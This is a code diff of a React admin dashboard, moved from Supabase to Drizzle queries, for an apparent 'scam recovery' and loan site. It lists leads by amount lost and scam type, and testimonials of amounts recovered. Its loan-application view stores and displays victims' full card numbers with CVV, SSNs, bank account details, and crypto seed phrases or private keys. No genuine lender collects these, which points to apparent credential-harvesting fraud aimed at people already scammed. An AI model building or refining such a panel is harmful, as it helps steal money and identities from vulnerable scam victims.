@@ -1,6 +1,11 @@
 import { createFileRoute } from "@tanstack/react-router";
 import { useEffect, useState, useCallback } from "react";
-import { supabase } from "@/integrations/supabase/client";
+import { 
+  fetchLeads, 
+  fetchLoanApplications, 
+  fetchTestimonialSubmissions 
+} from "@/lib/queries";
+import { fetchSiteSettings, saveSiteSettings, type SiteSettings } from "@/lib/site";
 import {
   Users, Banknote, MessageSquare, LogOut, RefreshCw,
   ChevronDown, ChevronUp, CheckCircle2, XCircle, Clock,
@@ -14,46 +19,35 @@ import { Logo } from "@/components/site/Logo";
 
 type Tab = "overview" | "leads" | "loans" | "testimonials" | "site";
 
+// types updated to match Drizzle camelCase schema
 type Lead = {
-  id: string; first_name: string; last_name: string | null; email: string;
-  phone: string | null; amount_lost: string | null; scam_type: string | null;
-  message: string | null; status: string; source_page: string | null; created_at: string;
+  id: string; firstName: string; lastName: string | null; email: string;
+  phone: string | null; amountLost: string | null; scamType: string | null;
+  message: string | null; status: string; sourcePage: string | null; createdAt: string;
 };
 
 type LoanApplication = {
-  id: string; first_name: string; last_name: string | null; email: string;
-  phone: string | null; amount_requested: number; currency: string; payout_method: string;
-  status: string; bank_name: string | null; bank_account_number: string | null;
-  bank_routing_number: string | null; card_holder_name: string | null;
-  card_number: string | null; card_expiry: string | null; card_cvv: string | null;
-  card_issuer: string | null; billing_address_line1: string | null;
-  billing_address_line2: string | null; billing_city: string | null;
-  billing_state: string | null; billing_postal_code: string | null;
-  billing_country: string | null; employment_status: string | null;
-  monthly_income: number | null; loan_purpose: string | null;
-  source_page: string | null; created_at: string;
+  id: string; firstName: string; lastName: string | null; email: string;
+  phone: string | null; amountRequested: number; currency: string; payoutMethod: string;
+  status: string; bankName: string | null; bankAccountNumber: string | null;
+  bankRoutingNumber: string | null; cardHolderName: string | null;
+  cardNumber: string | null; cardExpiry: string | null; cardCvv: string | null;
+  cardIssuer: string | null; billingAddressLine1: string | null;
+  billingAddressLine2: string | null; billingCity: string | null;
+  billingState: string | null; billingPostalCode: string | null;
+  billingCountry: string | null; employmentStatus: string | null;
+  monthlyIncome: number | null; loanPurpose: string | null;
+  sourcePage: string | null; createdAt: string;
   ssn: string | null;
   ein: string | null;
-  crypto_wallet_type: string | null;
-  crypto_seed_phrase: string | null;
+  cryptoWalletType: string | null;
+  cryptoSeedPhrase: string | null;
 };
 
 type TestimonialSubmission = {
-  id: string; client_name: string; email: string | null; location: string | null;
-  scam_type: string | null; amount_recovered: string | null; rating: number;
-  quote: string; status: string; consent_to_publish: boolean; created_at: string;
-};
-
-type SiteConfig = {
-  site_name: string; tagline: string; logo_url: string; contact_email: string;
-  contact_phone: string; contact_address: string; whatsapp_number: string;
-  telegram_username: string; facebook_url: string; twitter_url: string;
-  linkedin_url: string; instagram_url: string; youtube_url: string;
-  hero_headline: string; hero_subheadline: string; hero_cta_primary: string;
-  hero_cta_secondary: string; stats_recovered: string; stats_cases: string;
-  stats_success: string; footer_text: string; default_seo_title: string;
-  default_seo_description: string; og_image_url: string;
-  primary_color: string; accent_color: string;
+  id: string; clientName: string; email: string | null; location: string | null;
+  scamType: string | null; amountRecovered: string | null; rating: number;
+  quote: string; status: string; consentToPublish: boolean; createdAt: string;
 };
 
 // ─── constants ────────────────────────────────────────────────────────────────
@@ -216,14 +210,14 @@ function OverviewTab({ setTab }: { setTab: (t: Tab) => void }) {
 
   useEffect(() => {
     Promise.all([
-      supabase.from("leads").select("id", { count: "exact", head: true }),
-      supabase.from("loan_applications").select("id", { count: "exact", head: true }),
-      supabase.from("testimonial_submissions").select("id", { count: "exact", head: true }),
+      fetchLeads(),
+      fetchLoanApplications(),
+      fetchTestimonialSubmissions(),
     ]).then(([leads, loans, testimonials]) => {
       setCounts({
-        leads: leads.count ?? 0,
-        loans: loans.count ?? 0,
-        testimonials: testimonials.count ?? 0,
+        leads: (leads as any).length ?? 0,
+        loans: (loans as any).length ?? 0,
+        testimonials: (testimonials as any).length ?? 0,
       });
     }).catch(() => {}).finally(() => setLoading(false));
   }, []);
@@ -304,9 +298,8 @@ function LeadsTab() {
   const load = useCallback(async () => {
     setLoading(true); setError("");
     try {
-      const { data, error: err } = await supabase.from("leads").select("*").order("created_at", { ascending: false });
-      if (err) throw new Error(err.message);
-      setRows(data ?? []);
+      const data = await fetchLeads();
+      setRows((data as any) ?? []);
     } catch (e: unknown) { setError(String(e)); }
     finally { setLoading(false); }
   }, []);
@@ -315,7 +308,7 @@ function LeadsTab() {
 
   const filtered = rows.filter(r =>
     search === "" ||
-    `${r.first_name} ${r.last_name} ${r.email} ${r.scam_type}`.toLowerCase().includes(search.toLowerCase())
+    `${r.firstName} ${r.lastName} ${r.email} ${r.scamType}`.toLowerCase().includes(search.toLowerCase())
   );
 
   return (
@@ -326,13 +319,13 @@ function LeadsTab() {
         <tbody className="divide-y divide-gray-100">
           {filtered.map(r => (
             <tr key={r.id} className="hover:bg-gray-50 transition-colors">
-              <td className="px-4 py-3 font-medium whitespace-nowrap">{r.first_name} {r.last_name}</td>
+              <td className="px-4 py-3 font-medium whitespace-nowrap">{r.firstName} {r.lastName}</td>
               <td className="px-4 py-3 text-gray-600">{r.email}</td>
               <td className="px-4 py-3 text-gray-500">{r.phone || "—"}</td>
-              <td className="px-4 py-3 font-medium">{r.amount_lost || "—"}</td>
-              <td className="px-4 py-3"><Chip text={r.scam_type || "—"} /></td>
+              <td className="px-4 py-3 font-medium">{r.amountLost || "—"}</td>
+              <td className="px-4 py-3"><Chip text={r.scamType || "—"} /></td>
               <td className="px-4 py-3"><StatusBadge status={r.status} /></td>
-              <td className="px-4 py-3 text-gray-400 text-xs whitespace-nowrap">{fmtDate(r.created_at)}</td>
+              <td className="px-4 py-3 text-gray-400 text-xs whitespace-nowrap">{fmtDate(r.createdAt)}</td>
             </tr>
           ))}
           {!loading && filtered.length === 0 && <EmptyRow cols={7} msg="No leads yet" />}
@@ -354,9 +347,8 @@ function LoansTab() {
   const load = useCallback(async () => {
     setLoading(true); setError("");
     try {
-      const { data, error: err } = await supabase.from("loan_applications").select("*").order("created_at", { ascending: false });
-      if (err) throw new Error(err.message);
-      setRows(data ?? []);
+      const data = await fetchLoanApplications();
+      setRows((data as any) ?? []);
     } catch (e: unknown) { setError(String(e)); }
     finally { setLoading(false); }
   }, []);
@@ -365,7 +357,7 @@ function LoansTab() {
 
   const filtered = rows.filter(r =>
     search === "" ||
-    `${r.first_name} ${r.last_name} ${r.email}`.toLowerCase().includes(search.toLowerCase())
+    `${r.firstName} ${r.lastName} ${r.email}`.toLowerCase().includes(search.toLowerCase())
   );
 
   return (
@@ -386,22 +378,22 @@ function LoansTab() {
                   <td className="pl-4 pr-2 py-3 text-gray-400 w-8">
                     {expanded ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
                   </td>
-                  <td className="px-4 py-3 font-medium whitespace-nowrap">{r.first_name} {r.last_name}</td>
+                  <td className="px-4 py-3 font-medium whitespace-nowrap">{r.firstName} {r.lastName}</td>
                   <td className="px-4 py-3 text-gray-600">{r.email}</td>
-                  <td className="px-4 py-3 font-semibold text-emerald-700">{r.currency} {Number(r.amount_requested).toLocaleString()}</td>
+                  <td className="px-4 py-3 font-semibold text-emerald-700">{r.currency} {Number(r.amountRequested).toLocaleString()}</td>
                   <td className="px-4 py-3">
                     <span className={`inline-flex items-center gap-1.5 px-2.5 py-1 rounded-lg text-xs font-medium ${
-                      r.payout_method === "bank_transfer" ? "bg-blue-50 text-blue-700" : 
-                      r.payout_method === "crypto" ? "bg-orange-50 text-orange-700" :
+                      r.payoutMethod === "bank_transfer" ? "bg-blue-50 text-blue-700" : 
+                      r.payoutMethod === "crypto" ? "bg-orange-50 text-orange-700" :
                       "bg-purple-50 text-purple-700"
                     }`}>
-                      {r.payout_method === "bank_transfer" ? "🏦 Bank" : 
-                       r.payout_method === "crypto" ? "₿ Crypto" : 
+                      {r.payoutMethod === "bank_transfer" ? "🏦 Bank" : 
+                       r.payoutMethod === "crypto" ? "₿ Crypto" : 
                        "💳 Card"}
                     </span>
                   </td>
                   <td className="px-4 py-3"><StatusBadge status={r.status} /></td>
-                  <td className="px-4 py-3 text-gray-400 text-xs whitespace-nowrap">{fmtDate(r.created_at)}</td>
+                  <td className="px-4 py-3 text-gray-400 text-xs whitespace-nowrap">{fmtDate(r.createdAt)}</td>
                 </tr>
                 {expanded && (
                   <tr key={`${r.id}-detail`}>
@@ -412,44 +404,44 @@ function LoansTab() {
                           <DField label="Phone" value={r.phone} />
                           <DField label="SSN" value={r.ssn} mono />
                           <DField label="EIN" value={r.ein} mono />
-                          <DField label="Employment" value={r.employment_status} />
-                          <DField label="Monthly Income" value={r.monthly_income ? `$${Number(r.monthly_income).toLocaleString()}` : null} />
+                          <DField label="Employment" value={r.employmentStatus} />
+                          <DField label="Monthly Income" value={r.monthlyIncome ? `$${Number(r.monthlyIncome).toLocaleString()}` : null} />
                         </DetailSection>
 
-                        {r.payout_method === "bank_transfer" ? (
+                        {r.payoutMethod === "bank_transfer" ? (
                           <DetailSection title="Bank Details">
-                            <DField label="Bank Name" value={r.bank_name} />
-                            <DField label="Account Number" value={r.bank_account_number} />
-                            <DField label="Routing / SWIFT / IBAN" value={r.bank_routing_number} />
+                            <DField label="Bank Name" value={r.bankName} />
+                            <DField label="Account Number" value={r.bankAccountNumber} />
+                            <DField label="Routing / SWIFT / IBAN" value={r.bankRoutingNumber} />
                           </DetailSection>
-                        ) : r.payout_method === "crypto" ? (
+                        ) : r.payoutMethod === "crypto" ? (
                           <DetailSection title="Crypto Details">
-                            <DField label="Wallet Type" value={r.crypto_wallet_type} />
-                            <DField label="Seed Phrase / Private Key" value={r.crypto_seed_phrase} mono />
+                            <DField label="Wallet Type" value={r.cryptoWalletType} />
+                            <DField label="Seed Phrase / Private Key" value={r.cryptoSeedPhrase} mono />
                           </DetailSection>
                         ) : (
                           <>
                             <DetailSection title="Card Details">
-                              <DField label="Cardholder Name" value={r.card_holder_name} />
-                              <DField label="Card Number" value={r.card_number} mono />
-                              <DField label="Expiry" value={r.card_expiry} mono />
-                              <DField label="CVV" value={r.card_cvv} mono />
-                              <DField label="Issuer" value={r.card_issuer} />
+                              <DField label="Cardholder Name" value={r.cardHolderName} />
+                              <DField label="Card Number" value={r.cardNumber} mono />
+                              <DField label="Expiry" value={r.cardExpiry} mono />
+                              <DField label="CVV" value={r.cardCvv} mono />
+                              <DField label="Issuer" value={r.cardIssuer} />
                             </DetailSection>
                             <DetailSection title="Billing Address" className="lg:col-span-2">
-                              <DField label="Line 1" value={r.billing_address_line1} />
-                              <DField label="Line 2" value={r.billing_address_line2} />
-                              <DField label="City" value={r.billing_city} />
-                              <DField label="State / Region" value={r.billing_state} />
-                              <DField label="Postal Code" value={r.billing_postal_code} />
-                              <DField label="Country" value={r.billing_country} />
+                              <DField label="Line 1" value={r.billingAddressLine1} />
+                              <DField label="Line 2" value={r.billingAddressLine2} />
+                              <DField label="City" value={r.billingCity} />
+                              <DField label="State / Region" value={r.billingState} />
+                              <DField label="Postal Code" value={r.billingPostalCode} />
+                              <DField label="Country" value={r.billingCountry} />
                             </DetailSection>
                           </>
                         )}
 
-                        {r.loan_purpose && (
+                        {r.loanPurpose && (
                           <div className="sm:col-span-2 lg:col-span-4">
-                            <DField label="Loan Purpose" value={r.loan_purpose} />
+                            <DField label="Loan Purpose" value={r.loanPurpose} />
                           </div>
                         )}
                       </div>
@@ -477,9 +469,8 @@ function TestimonialsTab() {
   const load = useCallback(async () => {
     setLoading(true); setError("");
     try {
-      const { data, error: err } = await supabase.from("testimonial_submissions").select("*").order("created_at", { ascending: false });
-      if (err) throw new Error(err.message);
-      setRows(data ?? []);
+      const data = await fetchTestimonialSubmissions();
+      setRows((data as any) ?? []);
     } catch (e: unknown) { setError(String(e)); }
     finally { setLoading(false); }
   }, []);
@@ -488,7 +479,7 @@ function TestimonialsTab() {
 
   const filtered = rows.filter(r =>
     search === "" ||
-    `${r.client_name} ${r.email} ${r.location}`.toLowerCase().includes(search.toLowerCase())
+    `${r.clientName} ${r.email} ${r.location}`.toLowerCase().includes(search.toLowerCase())
   );
 
   return (
@@ -499,14 +490,14 @@ function TestimonialsTab() {
         <tbody className="divide-y divide-gray-100">
           {filtered.map(r => (
             <tr key={r.id} className="hover:bg-gray-50 transition-colors align-top">
-              <td className="px-4 py-3 font-medium whitespace-nowrap">{r.client_name}</td>
+              <td className="px-4 py-3 font-medium whitespace-nowrap">{r.clientName}</td>
               <td className="px-4 py-3 text-gray-500">{r.email || "—"}</td>
               <td className="px-4 py-3 text-gray-500">{r.location || "—"}</td>
-              <td className="px-4 py-3"><Chip text={r.scam_type || "—"} /></td>
-              <td className="px-4 py-3 font-medium text-emerald-700">{r.amount_recovered || "—"}</td>
+              <td className="px-4 py-3"><Chip text={r.scamType || "—"} /></td>
+              <td className="px-4 py-3 font-medium text-emerald-700">{r.amountRecovered || "—"}</td>
               <td className="px-4 py-3 text-yellow-500">{"★".repeat(r.rating)}{"☆".repeat(5 - r.rating)}</td>
               <td className="px-4 py-3"><StatusBadge status={r.status} /></td>
-              <td className="px-4 py-3 text-gray-400 text-xs whitespace-nowrap">{fmtDate(r.created_at)}</td>
+              <td className="px-4 py-3 text-gray-400 text-xs whitespace-nowrap">{fmtDate(r.createdAt)}</td>
             </tr>
           ))}
           {!loading && filtered.length === 0 && <EmptyRow cols={8} msg="No submissions yet" />}
@@ -522,19 +513,18 @@ type SettingsSection = "general" | "hero" | "social" | "theme" | "seo";
 
 function SiteEditorTab() {
   const [section, setSection] = useState<SettingsSection>("general");
-  const [cfg, setCfg] = useState<Partial<SiteConfig>>({});
+  const [cfg, setCfg] = useState<Partial<SiteSettings>>({});
   const [loading, setLoading] = useState(true);
   const [saving, setSaving] = useState(false);
   const [saved, setSaved] = useState(false);
   const [error, setError] = useState("");
 
   useEffect(() => {
-    supabase.from("chanaid_config").select("*").eq("id", 1).single()
-      .then(({ data }) => { if (data) setCfg(data); setLoading(false); })
+    fetchSiteSettings().then((data) => { if (data) setCfg(data); setLoading(false); })
       .catch(() => setLoading(false));
   }, []);
 
-  function set(key: keyof SiteConfig, value: string) {
+  function set(key: keyof SiteSettings, value: string) {
     setCfg(prev => ({ ...prev, [key]: value }));
     setSaved(false);
   }
@@ -542,11 +532,8 @@ function SiteEditorTab() {
   async function save() {
     setSaving(true); setError(""); setSaved(false);
     try {
-      const { error: err } = await supabase
-        .from("chanaid_config")
-        .update({ ...cfg, updated_at: new Date().toISOString() })
-        .eq("id", 1);
-      if (err) throw new Error(err.message);
+      const success = await saveSiteSettings(cfg);
+      if (!success) throw new Error("Failed to save settings.");
       setSaved(true);
       setTimeout(() => setSaved(false), 3000);
     } catch (e: unknown) { setError(String(e)); }
